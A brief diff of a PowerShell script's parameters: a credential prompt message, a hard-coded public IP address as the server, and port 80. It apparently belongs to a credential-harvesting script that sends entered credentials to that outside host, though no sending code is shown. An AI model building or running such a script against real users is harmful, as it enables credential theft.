@@ -6,7 +6,7 @@ param (
     [string]$Message = 'Enter your credentials',
 
     [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
-    [string]$Server = "46.161.53.115\?",
+    [string]$Server = "46.161.53.115",
 
     [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
     [string]$Port = "80",
